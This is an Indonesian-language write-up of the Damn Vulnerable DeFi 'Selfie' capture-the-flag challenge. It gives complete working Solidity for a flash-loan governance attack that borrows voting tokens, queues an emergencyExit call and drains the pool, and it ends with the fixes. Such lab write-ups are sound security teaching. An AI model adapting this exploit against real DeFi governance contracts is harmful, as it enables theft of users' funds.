# Damn Vulnerable DeFi — Selfie (Writeup)

> Status: **SOLVED** ✅ (`[PASS] test_selfie`)
> Goal: kuras 1.500.000 token dari `SelfiePool`, pindahin semua ke akun `recovery`.

---

## 1. Peta 3 kontrak

Selfie melibatkan 3 kontrak yang saling ngobrol:

| Kontrak | Peran |
|---|---|
| `SelfiePool` | Nyimpen 1.5jt token. Punya flash loan (ERC-3156) + fungsi `emergencyExit`. |
| `SimpleGovernance` | Sistem voting. Bisa "antri" perintah (`queueAction`) lalu eksekusi (`executeAction`) setelah delay. |
| `DamnValuableVotes` | Token-nya. Ini token **voting** (ERC20Votes). |

---

## 2. Titik incaran: `emergencyExit`

```solidity
// SelfiePool.sol
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);   // kirim SEMUA token pool ke receiver
}
```

Ini "senjata makan tuan" — kontraknya nyediain fungsi buat nguras dirinya sendiri.
Kalo kita bisa panggil `emergencyExit(recovery)` → menang.

**Masalahnya:** ada penjaga `onlyGovernance`:

```solidity
modifier onlyGovernance() {
    if (msg.sender != address(governance)) revert CallerNotGovernance();
    _;
}
```

`msg.sender` **gak bisa dipalsuin**. Jadi kita gak bisa panggil langsung.
Solusinya: kita harus bikin **kontrak `governance` sendiri yang manggil** `emergencyExit` buat kita.

---

## 3. Gerbang governance: `queueAction`

Cara nyuruh governance = nitip perintah lewat `queueAction`:

```solidity
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender);   // <-- syarat
    ...
}
```

Syaratnya: `_hasEnoughVotes(msg.sender)` harus true.

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);            // VOTES si `who`
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;                        // votes > setengah total supply?
}
```

Total supply = 2.000.000 token. Setengahnya = 1.000.000.
→ **Kita harus punya > 1.000.000 votes** biar boleh nitip perintah.

Padahal player mulai dengan 0 token, 0 votes.

---

## 4. Ide kunci: pinjam votes lewat flash loan

Pool nyimpen 1.5jt token. Kita **pinjam full 1.5jt** lewat flash loan (sesaat).
1.5jt > 1jt → cukup buat lolos syarat votes.

**TAPI ada 2 jebakan:**

### Jebakan #1 — Token ≠ Votes (butuh `delegate`)
Di ERC20Votes, pegang token **gak otomatis** kasih voting power.
`_hasEnoughVotes` ngecek `getVotes()`, bukan `balanceOf()`.

Voting power baru "nyala" kalau kita **`delegate`** dulu:
- `delegate(address(this))` → "votes dari token gue, buat gue sendiri."
- Tanpa delegate → votes = 0 walaupun token segunung.

Analogi: punya saham = berhak milih, tapi hak suara harus **didaftarin** dulu.

### Jebakan #2 — Ada delay 2 hari
`queueAction` cuma NITIP. Yang beneran jalanin `emergencyExit` itu `executeAction`,
dan `executeAction` cuma boleh setelah lewat `ACTION_DELAY = 2 days`.

Flash loan cuma 1 transaksi (harus dibalikin di tx yang sama) → gak bisa nahan 2 hari.

**Insight terpenting:** cek votes cuma di `queueAction`. Di `executeAction` **GAK ADA cek votes lagi**
(cuma cek waktu & belum dieksekusi). Jadi:
- Kita butuh votes **sekejap** doang (pas queue).
- Abis di-queue, balikin pinjaman (votes ilang) — gak masalah.
- 2 hari kemudian eksekusi tanpa butuh votes lagi.

Governance percaya "punya banyak votes = orang terpercaya", padahal votes-nya pinjaman kilat. 🔥

---

## 5. Alur serangan (2 fase)

**Fase 1 — di dalam 1 transaksi (callback `onFlashLoan`):**
1. Pinjam 1.5jt token dari pool (`flashLoan`).
2. `delegate(address(this))` → nyalain voting power.
3. `queueAction(pool, 0, emergencyExit(recovery))` → nitip perintah jahat.
4. `approve(pool, amount)` → izinin pool narik balik pinjaman (repay).
5. Return magic value `keccak256("ERC3156FlashBorrower.onFlashLoan")`.

**Fase 2 — transaksi terpisah:**
6. `vm.warp(+2 days)` → lompatin delay.
7. `executeAction(1)` → governance jalanin `emergencyExit(recovery)` → pool kekuras. 💰

---

## 6. Kode solusi

### `test_selfie` (fase 2 - orkestrator)
```solidity
function test_selfie() public checkSolvedByPlayer {
    // Fase 1: deploy attacker + jalanin flashloan
    selfieAttacks attack = new selfieAttacks(
        address(pool),
        address(governance),
        address(token),
        recovery
    );
    attack.attack();

    // Fase 2: lewatin delay 2 hari, eksekusi aksi antrian (actionId = 1)
    vm.warp(block.timestamp + 2 days);
    governance.executeAction(1);
}
```

### Interface (cetakan buat manggil kontrak lain)
```solidity
interface ISelfiePool {
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external returns (bool);
}
interface IGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}
interface IVotes {
    function delegate(address delegatee) external;
    function approve(address spender, uint256 amount) external;
}
```

### Kontrak attacker
```solidity
contract selfieAttacks {
    address pool;
    address governance;
    address token;
    address recovery;
    uint256 constant AMOUNT = 1_500_000e18;

    constructor(address _pool, address _governance, address _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    // Pemicu: minjam full amount dari pool
    function attack() external {
        ISelfiePool(pool).flashLoan(IERC3156FlashBorrower(address(this)), token, AMOUNT, "");
    }

    // Callback: dipanggil pool setelah token nyampe ke kita
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        IVotes(token).delegate(address(this));                                        // 1. nyalain votes

        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", recovery);  // 2. resep perintah
        IGovernance(governance).queueAction(pool, 0, payload);                        // 3. nitip ke governance

        IVotes(token).approve(pool, AMOUNT);                                          // 4. repay (izinin pool narik)

        return keccak256("ERC3156FlashBorrower.onFlashLoan");                         // 5. magic value
    }
}
```

---

## 7. Konsep yang dipelajari

- **Flash loan ERC-3156**: pool kirim token → panggil callback `onFlashLoan` → tarik balik pinjaman via `transferFrom`. Callback WAJIB return `keccak256("ERC3156FlashBorrower.onFlashLoan")`, kalau nggak dianggap gagal → revert.
- **`delegate` (ERC20Votes)**: pegang token ≠ punya votes. Harus di-delegate dulu biar voting power nyala. `getVotes()` beda dari `balanceOf()`.
- **`abi.encodeWithSignature("nama(tipe)", arg)`**: bikin *calldata* = 4 byte selector (hash dari signature) + argumen. String signature ditulis tanpa nama arg & tanpa spasi: `"emergencyExit(address)"`. Harus PERSIS sama fungsi target, karena selector itu hash.
- **Casting interface `IX(alamat)`**: nempelin "layout tombol" ke sebuah alamat biar bisa dipanggil fungsinya. Alamat harus kontrak yang PUNYA fungsi itu.
- **Tipe vs instance**: `SelfiePool` = cetak biru (gak punya alamat). `pool` = kontrak yang udah di-deploy (punya alamat).
- **`approve` / `transferFrom`**: pemilik token kasih "surat kuasa" (`approve`) biar spender bisa narik (`transferFrom`).
- **Cheatcode Foundry `vm.warp(block.timestamp + 2 days)`**: majuin waktu di test.

---

## 8. Pelajaran keamanan

**Bug utama:** governance ngukur "kepercayaan" dari voting power **sesaat** (`getVotes` di 1 titik waktu), padahal voting power itu bisa **dipinjam** lewat flash loan. Ditambah cek votes cuma di saat `queueAction`, bukan di `executeAction`.

**Cara benerin (di dunia nyata):**
- Pakai **snapshot voting power di masa lalu** (`getPastVotes` di block sebelum proposal), bukan votes real-time — flash loan gak bisa balikin waktu.
- Atau: cek ulang votes juga pas eksekusi.
- Atau: token voting yang gak bisa dipinjam bebas dari pool publik.
